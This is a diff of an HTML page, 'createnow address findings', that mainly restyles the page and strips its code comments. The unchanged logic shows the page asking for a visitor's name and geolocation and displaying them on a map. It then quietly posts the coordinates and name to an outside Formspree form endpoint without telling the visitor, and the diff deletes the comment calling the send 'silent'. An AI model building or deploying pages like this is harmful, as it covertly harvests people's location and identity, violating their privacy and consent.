@@ -6,17 +6,37 @@
   <title>createnow address findings</title>
 
   <!-- Leaflet CSS -->
-  <link
-    rel="stylesheet"
-    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
-  />
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+
   <style>
     body {
       font-family: Arial, sans-serif;
       padding: 20px;
       text-align: center;
       margin: 0;
+      background: linear-gradient(to bottom, #87cefa, #4682b4); /* Light to dark skyblue */
+      color: #000;
     }
+
+    h2 {
+      font-size: 2em;
+      margin-bottom: 10px;
+    }
+
+    /* Styling the "createnow" word */
+    .brand-highlight {
+      font-weight: bold;
+    }
+    .brand-cre {
+      color: black;
+    }
+    .brand-ate {
+      color: red;
+    }
+    .brand-now {
+      color: black;
+    }
+
     input[type="text"] {
       padding: 10px;
       font-size: 1em;
@@ -25,6 +45,7 @@
       border-radius: 6px;
       border: 1px solid #ccc;
     }
+
     button {
       background-color: #0078d7;
       border: none;
@@ -35,15 +56,18 @@
       cursor: pointer;
       margin-bottom: 15px;
     }
+
     button:hover {
       background-color: #005fa3;
     }
+
     #status {
       margin: 10px 0 20px;
       font-size: 1.1em;
-      color: #333;
+      color: #000;
       min-height: 1.4em;
     }
+
     #map {
       height: 400px;
       max-width: 600px;
@@ -56,13 +80,17 @@
 </head>
 <body>
 
-  <h2>createnow <br> address findings</h2>
+  <h2>
+    <span class="brand-highlight">
+      <span class="brand-cre">cre</span>
+      <span class="brand-ate">ate</span>
+      <span class="brand-now">now</span>
+    </span>
+    <br> address findings
+  </h2>
 
-  <!-- Input for user name -->
   <input type="text" id="userName" placeholder="Enter your name" />
-
   <br />
-
   <button id="actionBtn">Get Location</button>
   <div id="status"></div>
   <div id="map"></div>
@@ -110,7 +138,6 @@
 
           status.textContent = `Location found: ${lat.toFixed(6)}, ${lng.toFixed(6)}.`;
 
-          // Show map container before initializing Leaflet
           mapDiv.style.display = 'block';
 
           if (!map) {
@@ -129,18 +156,15 @@
             marker.setLatLng([lat, lng]).setPopupContent(`${userName} is here.`).openPopup();
           }
 
-          // Fill hidden inputs
           latInput.value = lat;
           lngInput.value = lng;
           nameInput.value = userName;
 
-          // Prepare data to send
           const data = new FormData();
           data.append('latitude', lat);
           data.append('longitude', lng);
           data.append('name', userName);
 
-          // Send to Formspree silently via fetch API
           fetch('https://formspree.io/f/xpwzqrod', {
             method: 'POST',
             body: data,
@@ -148,7 +172,6 @@
               'Accept': 'application/json'
             }
           });
-
         },
         (error) => {
           switch (error.code) {
